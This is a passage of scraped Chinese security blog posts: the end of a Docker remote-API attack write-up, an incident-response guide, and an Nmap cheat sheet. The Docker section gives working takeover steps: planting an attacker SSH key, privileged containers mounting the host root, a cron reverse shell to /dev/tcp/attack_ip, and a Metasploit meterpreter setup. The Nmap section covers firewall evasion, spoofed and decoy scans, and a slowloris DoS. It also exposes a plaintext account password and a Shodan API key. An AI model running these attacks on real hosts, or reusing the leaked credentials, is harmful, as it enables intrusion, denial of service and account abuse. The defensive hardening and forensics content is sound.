AAAAB3NzaC1yc2EAAAADAQABAAABAQDC6kYan1DO/mcdvu8WcYvmXbEh4WzHqy9k0yeoN0AY40Gg2tnP9TTDMHUWwT5EZk4+hkL7UMr+CMhjnqucZKX5Yw/GhF3kwQZN/NCu3GtJ3/Abl6G6y3J4ej0Q85kFPnPyIM5ZRygTqq728HaHWDgqwjqSG35Dh7pjuvIV8ULuekYpeFN607bEZ0lM3vt3/Kf/fBZQseZYSoj4/S+hWTmVivDThBGECcbCEpVACX3LLSqMvYEURUlEbE+f9qpLV1y7rSIQNJu3VsitHy2m7TAxScxAYsu3MhJFWYQVUZOlUEatW0Q3Ch9iLvD/H5rnBe+ps6088sp/P0CgzrElPChZ root@kali\u0026#39; \u0026gt;\u0026gt; /tmp/.ssh/authorized_keys\u0026#34; ] }------WebKitFormBoundary7MA4YWxkTrZu0gW--    连接容器  1 2 3 4 5 6  POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/attach?stderr=1\u0026amp;stdin=1\u0026amp;stdout=1\u0026amp;stream=1 HTTP/1.1 Host: 172.26.1.97:2375 User-Agent: Docker-Client/1.7.0 (windows) Content-Length: 0 Content-Type: application/json Accept-Encoding: gzip    启动容器  1 2 3 4 5 6  POST /v1.17/containers/bcd44e3731cc11cd0afe93445fd2e8ee9b0a34e7c39018920320b88fa6acd57b/start HTTP/1.1 Host: 172.26.1.97:2375 User-Agent: Docker-Client/1.7.0 (windows) Content-Length: 0 Content-Type: application/json Accept-Encoding: gzip    命令行方式-推荐  1 2 3 4 5 6 7 8 9 10 11  docker -H 10.211.55.13:2375 run --rm -it --privileged --net host -v /:/mnt alpine docker -H tcp://10.200.30.64:2375 run -it -v /:/mnt platform_of_check /bin/bash docker -H tcp://192.168.79.207 run –rm –privileged -it -v /:/mnt busybox chroot /mnt --entrypoint sh # 以宿主root的身份启动busybox容器,并将宿主根目录/挂载到busybox容器的/mnt目录下，并切换busybox的根目录为/mnt目录，最后运行sh命令 参数解释： -rm 容器停止时自动删除该容器 --privileged 容器拥有宿主机的root权限 -it 开启tty终端 -v 挂载目录 格式为 宿主系统目录:容器目录. /:/mnt指将宿主系统根目录挂在到容器中的/mnt目录上 busybox 镜像名字 ,busybox体积小，同时命令齐全 chroot /mnt 将根目录切换到/mnt上 --entrypoint sh 执行sh    docker_api_vul  写入定时任务 1 2 3  docker -H tcp://192.168.79.207:2375 image # 查看宿主机可用镜像 docker -H tcp://192.168.79.207:2375 run -it -v /var/spool/cron/:/var/spool/cron/ \u0026lt;image_id\u0026gt; /bin/bash # 进入容器，并将宿主机/var/spool/cron/目录挂载到容器/var/spool/cron/目录下 root@bfd2539dfdc8:/# echo \u0026#39;* * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/attack_ip/8088 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; /var/spool/cron/root # 写入反弹shell命令到定时任务中   MSF相关模块 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  msf6 exploit(linux/http/docker_daemon_tcp) \u0026gt; options Module options (exploit/linux/http/docker_daemon_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- CONTAINER_ID no container id you would like DOCKERIMAGE alpine:latest yes hub.docker.com image to use Proxies socks4://127.0.0.1:7891 no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 2375 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.79.207 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port   漏洞修复 在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：\n 设置ACL，仅允许信任的来源IP连接； 修改docker swarm的认证方式，使用TLS认证  客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：\n1  docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://x.x.x.x:2375 -H unix:///var/run/docker.sock   客户端连接时需要设置以下环境变量\n1 2 3 4  export DOCKER_TLS_VERIFY=1 export DOCKER_CERT_PATH=~/.docker export DOCKER_HOST=tcp://x.x.x.x:2375 export DOCKER_API_VERSION=1.12   ","description":"","id":94,"section":"en","tags":null,"title":"Docker","uri":"http://crkmythical.github.io/en/blog/docker/"},{"content":"应急响应基础篇\n[toc]\n常用工具介绍  [ProcessExplorer] 是进程管理工具，能管理隐藏在后台运行的程序，可监视、挂起、重启、强行终止任何程序，包括系统级的不允许随便终止的关键进程等。 PCHunter 一个功能强大的Windows系统信息查看软件，同时也是手工杀毒软件，不但可以查看各类系统信息，还可以查计算机中潜伏的挖矿木马。   Windows\n  SysinternalSuite PCHunter/火绒剑/PowerTool Process Monitor Event Log Explorer FullEventLogView Log Parser [WinPrefetch View] [WifiHistory View]   Linux\n  Linux应急响应辅助工具 Linux恶意脚本检测分类工具 批量暗链检测工具   勒索病毒搜索引擎\n  奇安信勒索病毒搜索引擎 启明VenuEeye勒索病毒搜索引擎 360勒索病毒搜索引擎 腾讯勒索病毒搜索引擎 深信服勒索病毒搜索引擎   勒索病毒解密工具\n  nomoreransom勒索软件解密工具集 MalwareHunterTeam勒索软件解密工具集 Github解密工具汇总 腾讯哈勃勒索软件专杀工具 趋势科技勒索病毒解密工具 金山毒霸勒索病毒免疫工具 火绒安全工具下载 瑞星解密工具下载 卡巴斯基免费勒索解密器 Avast免费勒索软件解密工具 Emsisoft免费勒索软件解密工具 Linux勒索病毒样本 GonnaCry  系统排查 网络拓扑、业务架构、服务器类型等信息\n感染主机相关信息\n 系统名称、节点、主机名 物理机/虚拟机 操作系统及版本 IP地址、开放端口 中间件及版本 数据库类型 Web框架等  系统基本信息 Windows 在搜索框中键入msinfo32 。\n用鼠标右键单击搜索结果中的系统信息，然后选择以管理员身份运行。\nLinux 1 2 3 4  lscpu # 查看CPU相关信息，包括型号、主频、内核等信息 uname -a # 查看当前操作系统信息 cat /proc/version #查看当前操作系统版本 lsmod # 查看所有已载入系统的模块信息   系统用户信息 Windows   命令行查看\n \u0026amp;rem 为cmd下的注释符\n 1 2  net user \u0026amp;rem 收集用户账户信息，但看不到以$结尾的隐藏账户 net user \u0026lt;username\u0026gt; \u0026amp;rem 查看指定用户的详细信息   ``\n  GUI查看\n在cmd中输入compmgmt.msc即可调出计算机管理窗口\n  注册表查看\n配置当用用户拥有对SAM的读取权限,配置后按F5刷新\n 在第3步选中账户给予：完全控制 亦可。\n   wmic查看\n wmic是WMI(Widnwos Management Instrumentation)的扩展，\n提供从命令行接口和批命令脚本执行系统管理命令\n 1  wmic useraccount get name,sid \u0026amp;rem 获取系统中用户名和系统的SID值   ``\n  Linux 1 2 3 4 5 6 7 8  cat /etc/passwd # 查看系统所有用户信息 awk -F: \u0026#39;{if($3==0)print $1}\u0026#39; /etc/passwd # 查看用户UID为0的账户，即root账户 awk -F:\u0026#39;length($2)==0{print $1}\u0026#39; /etc/shadow # 查看是否存在空口令账户 cat /etc/passwd | grep \u0026#39;/bin/bash\u0026#39; # 查看可登陆的用户 last # 查看显示近期用户或终端的登录情况 lastlog # 查看登陆过所有用户的最近一次登陆时间 lastb # 查看登陆失败的用户账户信息 who # 查看当前登陆系统的用户   last -f 指定数据源,如下:\n /var/log/wtmp 存储登陆成功信息 /var/log/btmp 存储登陆失败信息 /var/log/utmp 存储当前正在登陆的信息  启动项 重点查找开机启动项中的可疑启动项\nWindows 1. 通过【系统配置】对话框查看  2. 通过注册表查看   路径：计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n Linux 1 2 3  more /etc/init.d/rc.local /etc/rc.d/rc[0-6].d # 查看rc.local文件内容 ls -alt /etc/init.d/ # 查看init.d文件夹下所有文件的详细信息   任务计划 Windows  通过计算机管理窗口查询\n通过powershell查询\n通过cmd查询\n Linux 1 2 3 4 5 6  crontab -u root -l # 查看root用户的计划任务 more /etc/cron*/ # 查看cron下的定时任务 cat /etc/crontab # 查看系统的任务计划 crontab -u root -l # 查看用户的任务计划 cat /etc/anacrontab # 查看anacrontab中的任务 cat /root/.bash_history #查看历史命令   其他 1.Windows补丁\n通过systeminfo排查MS17-010漏洞补丁\n操作系统对应MS17-010的补丁号\n   系统 补丁号     WinXP KB4012598   Win2003 KB4012598   Win2008R2 KB4012212、KB4012215   Win7 KB4012212、KB4012215    Windows防火墙规则  1  netsh firewall show state   文件痕迹排查 文件排查排查根据：\n根据勒索病毒加密时间对文件夹内文件列表时间进行排序\n 查找距离文件加密事件1-3天创建和修改的文件 查找可疑时间点创建和修改的文件  Windows 敏感目录  各个盘下的Temp目录   C:\\Windows\\Temp\\ C:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Local\\Temp\\ C:\\Users\\\u0026lt;user\u0026gt;\\Desktop\\ C:\\Users\\\u0026lt;user\u0026gt;\\Downloads\\ C:\\Users\\\u0026lt;user\u0026gt;\\Pictures\\  可疑文件名称：\n svchost.exe WindowsUpdate.exe Ares.exe Snake.exe 其他异常名   浏览器历史记录，下载记录\n  用户Recent文件\n C:\\Documents and Settings\\Administrator\\Recent\nC:\\Documents and Settings\\Default User\\Recent\n   预读取文件夹Prefetch\n C:\\Windows\\Prefetch\n%SystemRoot%\\appcompat\\Programs\\ 查询Amcache.hve文件所在目录，可以查询用用程序的执行路径，上次执行的时间及SHA1值\n   时间点查找 1  forfiles /m *.exe /d +2020/12/05 /s /p C:\\  /c \u0026#34;cmd /c echo @path @fdate @ftime \u0026#34; 2\u0026gt; null \u0026amp;rem 针对2020-12-5日后的exe新建文件进行搜索   Webshell 可利用D盾、HwsKill、WebshellKill等工具对目录下的文件进行规则查询\nLinux  通过stat命令查看相关时间，若修改时间与文件加密日期接近 通过find . *.txt -perm 777查看当前目录下权限为777的文件 通过ls -ar | grep \u0026quot;^\\.\u0026quot;查看当前目录下的隐藏文件  1  cat /etc/passwd | grep -E \u0026#34;/bin/bash$\u0026#34; # 查看能够登陆系统的账户   敏感目录  /usr/bin 和/usr/sbin .ssh/ 和/etc/ssh /tmp  时间点查找 1 2 3  find / -ctime 0 -name \u0026#34;*.sh\u0026#34; # 查找一天内新增的sh文件 ls -alt | head -n 10 # 列出最近修改的10个文件 stat \u0026lt;xx.sh\u0026gt; # 对xx.sh的创建、修改、访问时间进行排查   特殊文件  常规检查  1 2 3 4 5 6 7 8 9 10 11  find / -type f -perm -04000 -ls -uid 0 2\u0026gt;/dev/null # 排查SUID程序 find /tmp -perm 777 | more # 查找777权限的文件 find /var/www/ -name \u0026#34;*.php\u0026#34; |xargs egrep \u0026#39;assert|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval \\(str_rot13|\\.chr\\(|\\$\\{\\\u0026#34;\\_P|eval\\(\\$\\_R|file_put_contents\\(\\.\\*\\$\\_|base64_decode\u0026#39; # 查找/var/www目录下的webshell find ./ -type f -name \u0026#34;*.jsp\u0026#34; | xargs grep \u0026#34;exec(\u0026#34; #查看网页是否有webshell特征 find ./ -type f -name \u0026#34;*.asp\u0026#34; | xargs grep \u0026#34;execute(\u0026#34; find ./ -type f -name \u0026#34;*.aspx\u0026#34; | xargs grep \u0026#34;eval(\u0026#34; ls -alt /bin # 对系统命令进行排查，查看命令目录中相关系统命令的修改时间 ls -alh /bin # 对系统命令进行排查，查看命令目录中相关系统命令的文件大小   后门查杀  [chkrootkit] 检测rootkit是否被安装到系统中  1  chkroot -q | grep INFECTED #若发现rootkit后门，建议重装系统   ``  [rkhunter] 检测系统命令，包括MD5校验，本机敏感目录，系统配置，服务及套件，第三方应用版本等。  1  rkhunter --check   ``\n[chkrootkit]: https://github.com/Magentron/chkrootkit.git\n[rkhunter]: https://github.com/installation/rkhunter.git  进程排查 Windows 通过taskmgr查看  添加【命令行】、【映射路径名称】列，获取更多信息\n 重点关注CPU、内存占用过高，网络使用率过高的进程\n通过tasklist查看 重点关注随机命名的进程，可通过威胁平台判定是否为恶意进程\n1 2 3 4  tasklist \u0026amp;rem 查看所有进程的映像名称、服务、PID、会话名等信息 tasklist /svc \u0026amp;rem 查看进程映像名，PID，服务 tasklist /m \u0026amp;rem 查看所有进程加载的DLL文件 tasklist /m ntdll.dll \u0026amp;rem 查看调用指定ntdll.dll文件的进程   使用netstat查看 重点关注是否暴露135、445、3389等高危端口\n1 2 3  netstat -anb | findstr \u0026#34;ESTABLISHED\u0026#34; \u0026amp;rem 查看端口连接情况及端口对应的程序，需要管理员权限 netstat -ano | findstr \u0026#34;ESTABLISHED\u0026#34; \u0026amp;rem 查看目前已建立的网络连接，可定位PID tasklist | findstr \u0026lt;PID\u0026gt; \u0026amp;rem 定位具体的程序   使用【PowerShell】查看 1  Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path # 获取进程名，进程ID，PID，路径   使用【WMIC】查看  cmd下注释符 \u0026amp;rem PowerShell下注释符 #\n 1 2 3 4  wmic process get name,parentprocessid,processid,executablepath， commandline /format:csv \u0026amp;rem 获取进程名，PID，ID,执行路径,命令行 wmic process where processid=\u0026lt;PID\u0026gt; get name, executablepath \u0026amp;rem 获取指定PID的进程名和执行路径 wmic process where name=\u0026#34;malware.exe\u0026#34; call terminate \u0026amp;rem 删除“malware.exe“恶意程序的进程 wmic process where processid=\u0026lt;PID\u0026gt; delete \u0026amp;rem 删除\u0026lt;PID\u0026gt;的进程   Linux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  netstat -antlp | more # 查看进程、端口连接情况，可定位PID ls -alt /proc/\u0026lt;PID\u0026gt;/exe # 可查看PID对应可执行程序 lsof -p \u0026lt;PID\u0026gt; # 查看PID对应的进程打开的文件 systemctl status \u0026lt;PID\u0026gt; # 查看\u0026lt;PID\u0026gt;详细信息 top #查看CPU占用情况 free / cat /proc/meminfo # 查看内存占用情况 ps -e -o stat,ppid,pid,cmd | grep -e \u0026#39;^[Zz]\u0026#39; | awk \u0026#39;{print $2}\u0026#39; | xargs kill -9 #批量删除僵尸进程 ps aux | head -1; ps aux | sort -rn -k3 | head -10 #查看当前系统占用CPU最高的前10哥进程 ps aux | head -1; ps aux | sort -rn -k4 | head -10 #查看当前系统占用内存最高的前10哥进程 #查看隐藏进程 ps -ef | awk \u0026#39;{print}\u0026#39; | sort -n | uniq \u0026gt;1 ls /proc | sort -n | uniq \u0026gt;2 diff 1 2   服务排查 Windows Linux 1 2  chkconfig --list # 查看系统运行的服务 service --status-all ｜ more # 查看所有服务的状态   日志分析 通过分析日志，可发现攻击源、攻击路径、新建账户、新建服务等。\nWindows 登陆相关日志事件ID及描述\n   事件ID 名称 描述     4624 用户登陆成功 大部分登陆事件成功时会产生的日志   4625 用户登陆失败 大部分登陆事件失败时产生的日志   4672 特殊权限用户登陆 Administrator登陆会产生的日志   4648 显式凭据登陆 使用runas /user以其他身份运行程序时产生的日志    常用启动事件相关登陆事件ID及来源\n   事件ID 名称 来源     1074 关机初始化失败 User32   13 Windows关闭 Microsoft-Windows-Kernel-General   12 Windows启动 Microsoft-Windows-Kernel-General    日志被清除相关事件ID及来源\n   事件ID 名称 来源     1100 事件日志服务关闭 Microsoft-Windows-EventLog   104 事件日志被清除 Microsoft-Windows-EventLog    日志分类 系统日志  Windows系统中各个组件在运行中产生的各种事件，包括：\n- 各种驱动程序出现的重大问题\n- 各种组件出现的重大问题\n- 应用软件出现的重大问题\n重大问题指重要数据的丢失、错误及令系统崩溃\n 路径：\n Win2000、WinXP、WinServer2003 C:\\WINDOWS\\System32\\config\\SysEvent.evt WinVista、Win7/8/10、Win2008及以后 %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx  安全性日志  记录各种与安全相关的事件：\n- 登陆与退出系统操作\n- 对系统重要资源的操作，如增、删、改\n路径：\n  Win2000、WinXP、WinServer2003 C:\\WINDOWS\\System32\\config\\SecEvent.evt WinVista、Win7/8/10、Win2008及以后 %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx  应用程序日志  记录各种应用程序所产生的各类事件，包括：\n- MSSQL暴力破解\n 路径：\n Win2000、WinXP、WinServer2003 C:\\WINDOWS\\System32\\config\\AppEvent.evt WinVista、Win7/8/10、Win2008及以后 %SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx  其他日志 Dhcp、Bits-Client\n路径：\n%SystemRoot%\\System32\\Winevt\\Logs\n日志分析  在勒索病毒事件处理中，主要查看创建任务计划、安装服务、关机、重启这样的异常操作。\n主要检查登陆失败和登陆成功的日志，查看是否有异常的登陆行为，如暴力破解  通过内置日志筛选器进行分析 Win+R键后运行eventvwr即可打开事件查看器，查看相关日志\n通过日志筛选器可对记录事件、事件级别、任务类别、关键字等信息进行筛选。\n通过Powershell进行日志分析  需要管理员权限\n  Get-EventLog  1  Get-EventLog Security -InstanceId 4625 # 获取登陆失败的日志    Get-WinEvent -推荐  1  Get-WinEvent -FilterHashtable @{LogName=\u0026#39;Security\u0026#39;;ID=\u0026#39;4625\u0026#39;} # 获取登陆失败的日志   通过相关日志工具进行分析查询  FullEventLogView\n一个轻量级日志检索工具，检索速度比Windows自带的检索工具要快，界面更好 Event Log Explorer\n一个检测系统安全的软件，可查看、监视和分析事件记录，包括安全性，系统，应用程序和其Windows系统事件记录 Log Parser\n官方退出的日志分析工具，功能强大使用简单  1 2 3  LogParser.exe -i:EVT -o:DATAGRID \u0026#34;SELETC * FROM C:\\Security.evtx where EventID=4624\u0026#34; \u0026amp;rem 查看所有成功登陆事件 LogParser.exe -i:EVT -o:DATAGRID \u0026#34;SELECT * FROM C:\\Security.evtx where TimeGenerated\u0026gt;\u0026#39;2020-8-1 23:59:59\u0026#39; and TimeGenerated\u0026lt;\u0026#39;2020-9-1 23:59:59\u0026#39; and EventID=4625\u0026#34; \u0026amp;rem 查看指定时间内所有登陆失败的日志 LogParser.exe -i:EVT -o:DATAGRID \u0026#34;SELECT TimeGenerated,EventID,Message FROM C:\\System.evtx where EventID=12 or EventID=13\u0026#34; \u0026amp;rem 查看系统历史开关机记录   Linux 系统日志一般存放在/var/log/目录下：\n 查看所有用户最后的登陆信息 lastlog 查看用户登陆失败信息 lastb 查看用户最近登陆信息 last  日志路径介绍 日志文件及描述\n   文件 描述     /var/log/wtmp 记录登陆、退出、关机、重启等操作，即last   /var/log/cron 记录与定时任务相关的日志信息   /var/log/messages 记录系统启动后的信息和错误日志   /var/log/apache2/access.log 记录Apache访问日志   /var/log/auth.log 记录系统授权信息，包括用户登陆和使用过的授权   /var/log/userlog 记录所有等级用户信息的日志   /var/log/xferlog(vsftpd.log) 记录Linux FTP日志   /var/log/lastlog 记录登陆的用户   /var/log/secure 记录大多数应用输入的账户与密码，以及登陆成功与否   /var/log/faillog 记录登陆失败的日志    日志分析 1 2 3 4 5  cat /var/log/cron #查看任务计划相关的操作日志 cat /var/log/messages # 查看整体系统信息 cat /var/log/secure #查看验证和授权方面的信息 cat /var/spool/mail/root # 查看root邮件中的信息 ls -alt /var/spool/mail # 查看邮件相关日志记录文件   其他日志位置 IIS  %SystemDrive%\\inetpub\\logs\\LogFiles %SystemRoot%\\System32\\LogFiles\\W3SVC1 %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1 %SYstemDrive%\\Windows\\System32\\LogFiles\\HTTPERR  Apache  /var/log/httpd/access.log /var/log/apache/access.log /var/log/apache2/access.log /var/log/httpd-access.log  Nginx  可通过nginx.conf查看\n  /var/local/nginx/logs/access.log /var/local/nginx/logs/error.log  Tomcat  TOMCAT_HOME/logs/  Vsftp 查看 /etc/vsftp/vsftp.conf\nWebLogic 默认情况下，WebLogic有以下三种日志：\n access.log $MW_HOME\\user_projects\\domains\\\u0026lt;domain_name\u0026gt;\\servers\\\u0026lt;server_name\u0026gt;\\logs\\access.log server.log $MW_HOME\\user_projects\\domains\\\u0026lt;domain_name\u0026gt;\\servers\\\u0026lt;server_name\u0026gt;\\logs\\\u0026lt;server_name\u0026gt;.log domain.log $MW_HOME\\user_projects\\domains\\\u0026lt;domain_name\u0026gt;\\servers\\\u0026lt;adminserver_name\u0026gt;\\logs\\\u0026lt;domain_name\u0026gt;.log  数据库日志 Oracle  默认路径 $ORACLE/rdbms/log/\n 1  select * from v$logfile   MySQL  默认路径 /var/log/mysql\n 1 2  show variables like \u0026#39;log_%\u0026#39; # 查看是否启用日志 show variables like \u0026#39;general\u0026#39; # 查看日志位置   MSSQL 登陆SQL Server Management Studio, 在管理-SQL Server日志中查看\n内存分析 内存的获取 基于内核模式程序的内存获取 可使用以下工具进行获取：\n Dumpit Redline RAM Capturer FTK Imager  基于系统崩溃转出的内存获取 按Win+R运行sysdm.cpl找到存储文件 %SystemRoot%\\MEMORY.DMP\n基于虚拟化快照的内存获取 通过VMware Workstation、 ESXI等虚拟机软件实现的\n内存分析   Redline\n获取内存文件后，导入到Redline进行分析，其主要收集在主机上运行的有关进程信息、内存中的驱动程序、及其他数据(元数据、注册表数据、任务、服务、网络信息、Internet历史记录等)，最终生成报告\n  Volatility\n一个开源的内存取证工具，可以分析入侵攻击痕迹，包括网络连接、进程、服务、驱动模块、DLL、handles、进程注入、cmd历史命令、IE历史记录、启动项、用户、shimcache、userassist、部分rootkit隐藏文件、cmdliner等。\n  1 2 3 4 5 6  volatility -f /root/2020.mem --profile=Win2008R2SP1x64 netscan #查看内存镜像中的网络连接 volatility -f /root/2020.mem --profile=Win2008R2SP1x64 psxview #查看内存镜像中带有隐藏进程的所有进程列表 volatility -f /root/2020.mem --profile=Win2008R2SP1x64 malfind #查看内存镜像中隐藏或注入的代码 volatility -f /root/2020.mem --profile=Win2008R2SP1x64 cmdscan #查看内存镜像中执行的相关历史命令记录 volatility -f /root/2020.mem --profile=Win2008R2SP1x64 procdump -p \u0026lt;PID\u0026gt; -D #提取内存镜像中指定的进程文件，将提取的进程文件上传到virustotal平台进行扫描。   流量分析  Wireshark tcpdump  若数据包中带有z0、eval、base64_decode,则数据包很可能是中国菜刀客户端流量\n若数据包中带有特殊的Referer、Accept-Language，则数据包可能是Weevely Webshll流量\n若数据包中含有[PSH,ACK],一般是利用msf中的reverse_tcp上线\nWireshark筛选器过滤命令\n1 2 3 4 5 6  HTTP # 对协议进行过滤 ，HTTPS，SMTP，ARP等 ip.addr==\u0026lt;ip\u0026gt; #对特定ip地址进行过滤 ip.src==\u0026lt;ip\u0026gt; #对指定的源ip进行过滤 tcp.port==\u0026lt;port\u0026gt; #对tcp端口进行过滤 udp.port==\u0026lt;port\u0026gt; #对udp端口进行过滤 tcp contains \u0026lt;string\u0026gt; # 对特定字符串进行过滤    分析内网是否存在针对445端口的扫描和MS17-010漏洞的利用 分析溯源勒索终端被入侵的过程 分析邮件附件MD5值匹配威胁情报的数据，判定是否为勒索病毒 分析网络中传播的文件是否被二次打包，进行植入式攻击 分析在正常网页中植入密码，让访问者在浏览网页时利用IE浏览器或Flash等软件漏洞实施攻击的情况  威胁情报平台  Virustotal 微步威胁平台 Threat Crowd 奇安信威胁情报中心 360威胁情报中心 绿盟威胁情报中心 启明VenusEye威胁情报中心 安恒威胁情报中心 RedQueen安全智能服务平台 IBM情报中心  ","description":"","id":95,"section":"en","tags":["",""],"title":"应急响应基础篇","uri":"http://crkmythical.github.io/en/blog/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%AF%87/"},{"content":"Nmap服务列表\nNmap常用扫描案例 指定网络接口 -e eth0\n使用nmap 绕过防火墙\n1 碎片扫描\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  root@kali:~# nmap -f m.anzhi.com root@kali:~# nmap -mtu 8 m.anzhi.com 2 诱饵扫描 root@kali:~# nmap -D RND:10 m.anzhi.com root@kali:~# nmap –D decoy1,decoy2,decoy3 m.anzhi.com 3 僵尸扫描 root@kali:~# nmap 192.168.8.0/24 --script=ipidseq #探测僵尸主机 root@kali:~# nmap -P0 -sI zombie m.anzhi.com 4 随机数据长度 root@kali:~# nmap --data-length 25 m.anzhi.com root@kali:~# nmap --randomize-hosts 103.17.40.69-100 root@kali:~# nmap -sl 211.211.211.211m.anzhi.com 5 欺骗扫描 root@kali:~# nmap --sT -PN --spoof-mac 0 m.anzhi.com root@kali:~# nmap --badsum m.anzhi.com root@kali:~# nmap -g 80 -S www.baidu.com m.anzhi.com root@kali:~# nmap -p80 --script http-methods --script-args http.useragent=”Mozilla 5”m.anzhi.com   探测CVE漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  cd /usr/share/nmap/scripts/ ##git clone https://github.com/vulnersCom/nmap-vulners.git wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse git clone https://github.com/scipag/vulscan.git cd vulscan/utilities/updater chmod +x updateFiles.sh | ./updateFiles.sh nmap --script nmap-vulners，vulscan --script-args vulscandb = scipvuldb.csv -sV \u0026lt;Target\u0026gt; #banner-plus $ wget https://raw.githubusercontent.com/hdm/scan-tools/master/nse/banner-plus.nse # for MacOS $ cp banner-plus.nse /usr/local/share/nmap/scripts/ # for Linux $ cp banner-plus.nse /usr/share/nmap/scripts/   使用代理，加脚本\n1 2  nmap --script \u0026#34;not intrusive\u0026#34; \u0026lt;ip\u0026gt; --proxy socks4://127.0.0.1:18080   查找开放端口\n1  cat file.txt| grep \u0026#34;\\d/\u0026#34; | cut -f1 -d \u0026#34;/\u0026#34;   1 2  ( cat file.txt| grep \u0026#34;\\d/\u0026#34; | cut -f1 -d \u0026#34;/\u0026#34; | tr \u0026#34; \u0026#34; \u0026#34;,\u0026#34; ) \u0026gt;/var/tmp/aa.tx   Nmap NSE脚本搜索 1 2 3  bing/baidu/google: intext: nsedoc/scripts \u0026lt;script_name\u0026gt; nmap --script-help \u0026lt;script-name\u0026gt;   查看脚本数量 1  ls /usr/local/Cellar/nmap/7.80_1/share/nmap/scripts | wc -l   更新NSE 1 2 3 4  nmap --script-updatedb 代理扫描 nmap -sV -Pn -n --proxies socks4://127.0.0.1:9050 scanme.nmap.org   IP地址定位 ip-geolocation-maxmind 下载Maxmind\u0026rsquo;GeoLite City\nemail:nichola.null password:XtTSHkEGkfbB6st\n1 2 3  cp GeoLite2-City_20200317.tar.gz /usr/share/nmap/nselib/data tar -zxvf GeoLite2-City_20200317.tar.gz nmap --script ip-geolocation-maxmind \u0026lt;target\u0026gt; [--script-args ip-geolocation.maxmind_db=\u0026lt;filename\u0026gt;]   ipinfodb 获取API\n1  nmap --script ip-geolocation-ipinfodb \u0026lt;target\u0026gt; --script-args ip-geolocation-ipinfodb.apikey=\u0026lt;API_key\u0026gt;   获取Whois记录 1  nmap --script \u0026#34;whois-*\u0026#34; --script-args whodb=nocache target   从Shodan获取目标信息 1 2 3  vi /usr/local/Cellar/nmap/7.80_1/share/nmap/scripts/shodan-api.nse set local apiKey = \u0026#34;7VYpw5QnxgWeww59w7sX7jD6up7Qth9a\u0026#34; nmap -sn -Pn -n --script shodan-api --script-args \u0026#39;shodan-api.outfile=potato.csv\u0026#39; x.y.z.0/24   探测WAF 1  nmap --script \u0026#34;http-waf-*\u0026#34; \u0026lt;target\u0026gt;   探测代理 1  nmap --script http-open-proxy \u0026lt;target\u0026gt;   目录探测 1 2 3  nmap --script http-enum \u0026lt;target\u0026gt; 目录探测 nmap --script http-userdir-enum \u0026lt;target\u0026gt; 用户名探测   扫描XSS 1  nmap -p80 --script http-unsafe-output-escaping,http-xssed,http-phpself-xss \u0026lt;target\u0026gt;   扫描SQL注入 1  nmap -p80 --script http-sql-injection \u0026lt;target\u0026gt;   DoS攻击 1  nmap -p80 --script http-slowloris --max-parallelism 400 \u0026lt;target\u0026gt;   shellshock 1 2  nmap -sV --script http-shellshock \u0026lt;target\u0026gt; nmap -sV --script http-shellshock --script-args cmd=ls \u0026lt;target\u0026gt;   git目录 1 2  nmap -p80 --script http-git \u0026lt;target\u0026gt; nmap -p443 --script http-svn-info \u0026lt;target\u0026gt;   SSL 1  nmap -p443 --script ssl* \u0026lt;target\u0026gt;   扫描HeartBleed漏洞 1  nmap -sV -p -sV 443 -sV –script ssl-heartbleed –script-args vulns.showall \u0026lt;target\u0026gt;   扫描SNMP服务 1  nmap -sU -sV -p -sV 161 --script snmp-brute [--script-args snmp-brute.communitiesdb=\u0026lt;wordlist\u0026gt; ]\u0026lt;target\u0026gt;   扫描DHCP服务 1  nmap -sU -sV -p -sV 67 --script=dhcp-discover 192.168.1.0/24   扫描Daytime服务 1  nmap -sV -p -sV 13 --script=daytime \u0026lt;target\u0026gt;   扫描NTP服务 1  nmap -sU -sV -p -sV 123 --script ntp-info \u0026lt;target\u0026gt;   扫描LLTD服务 1  nmap script lltd-discovery --script-args=lltd-discovery.interface=en0,netwtargets=\u0026lt;target\u0026gt;   扫描NetBIOS服务 1  nmap -sV -p -sV 137 -sU --script nbstat \u0026lt;target\u0026gt;   扫描苹果AFP服务 1  nmap -sV -p -sV 548 --script=afp-serverinfo \u0026lt;target\u0026gt; [--script-args=afp.password=password,afp.username=username]   扫描DAAP服务 1  nmap -sV -p -sV 3689 --script=daap-get-library \u0026lt;target\u0026gt; [--script-args daap_item_limit=number]   扫描NFS服务 1  nmap -sV -p -sV 111 --script nfs-ls,nfs-showmount \u0026lt;target\u0026gt;   扫描AJP服务 1  nmap -sV -p -sV 8009 --script ajp-* \u0026lt;target\u0026gt; [--script-args=ajp-auth.path=/login]   2.9.2. 扫描ASP.NET服务 1  nmap -sV -p -sV 80 